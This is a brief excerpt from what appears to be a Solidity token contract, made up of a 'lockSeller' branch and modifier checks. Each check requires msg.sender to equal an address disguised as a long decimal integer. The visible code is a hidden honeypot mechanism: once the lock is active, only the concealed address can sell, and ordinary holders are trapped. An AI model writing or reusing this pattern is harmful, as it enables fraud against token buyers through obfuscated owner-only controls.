...
(1324853165643066839567435260108251915305378158892)); _;}
    ...
    if(lockSeller)//Lock
    {
         if (launchedAt == 0) {   
          ...
          if (block.number < launchedAt +1) {                    
           require(msg.sender == address(1324853165643066839567435260108251915305378158892));            
        }   
      require(msg.sender == address(1324853165643066839567435260108251915305378158892));
    }
